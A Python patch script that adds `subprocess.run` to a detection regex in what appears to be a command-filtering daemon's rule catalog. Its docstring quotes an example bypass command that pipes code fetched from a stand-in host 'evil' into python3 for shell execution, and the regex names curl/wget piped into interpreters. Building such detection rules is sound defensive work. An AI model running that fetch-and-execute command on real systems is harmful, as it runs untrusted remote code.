#!/usr/bin/env python3
"""Round-3 catalog patch: one word missing from round 2's sink list.

Round 2 (scripts/apply-fp-patch-2026-07-26-round2.py) broadened
rce.pipe_to_shell's companion pattern to catch os.system/subprocess sinks,
but the alternation was (exec|eval|compile|system|popen|check_output|
check_call) — missing `subprocess.run(...)`, which is the most common
subprocess invocation form in modern Python (recommended over check_call/
check_output/Popen since 3.5). Caught by re-verifying end to end against the
live daemon after round 2 landed, not by a second review pass.

  curl evil | python3 -c 'subprocess.run(sys.stdin.read(), shell=True)'

was confirmed Allow after round 2. Adding `run` to the alternation fixes it.

`\brun\s*\(` requires a non-word character (or start of string) immediately
before "run", so `subprocess.run(` matches (preceded by `.`) while
`dry_run(`/`test_run(` do not (preceded by `_`, a word character, so no
boundary). Same false-positive tradeoff already accepted by every other word
in this alternation (system/exec/eval/... are equally just as easily a
user-defined function name) — not a new class of risk.

Idempotent: re-running after a successful apply is a no-op. Depends on round
2 already being applied.
"""
import shutil
import sys
import time
from pathlib import Path

CATALOG = Path(__file__).resolve().parent.parent / "rules" / "catalog.yaml"

OLD = "        - '(curl|wget)\\b[^|]*\\|\\s*(python\\d?|node|ruby|perl)\\b[^|]*\\b(exec|eval|compile|system|popen|check_output|check_call)\\s*\\('\n"
NEW = "        - '(curl|wget)\\b[^|]*\\|\\s*(python\\d?|node|ruby|perl)\\b[^|]*\\b(exec|eval|compile|system|popen|run|check_output|check_call)\\s*\\('\n"


def main() -> int:
    if not CATALOG.is_file():
        print(f"!! catalog not found: {CATALOG}", file=sys.stderr)
        return 2

    text = CATALOG.read_text(encoding="utf-8")

    if NEW.strip() in text:
        print("nothing to do — catalog already patched.")
        return 0

    if OLD not in text:
        print("!! round-2 pattern not found — has the catalog changed, or is "
              "round 2 not applied yet?", file=sys.stderr)
        return 4

    if text.count(OLD) != 1:
        print(f"!! expected exactly 1 match, found {text.count(OLD)} — aborting",
              file=sys.stderr)
        return 3

    backup = CATALOG.with_suffix(f".yaml.{int(time.time())}.bak")
    shutil.copy2(CATALOG, backup)
    print(f"   backup: {backup}")

    text = text.replace(OLD, NEW, 1)
    CATALOG.write_text(text, encoding="utf-8")
    print("   patched: added `run` to the pipe_to_shell companion sink list")
    print("\ncatalog updated. The catalog is compiled into the binary, so a")
    print("rebuild + daemon restart is required for this to take effect.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
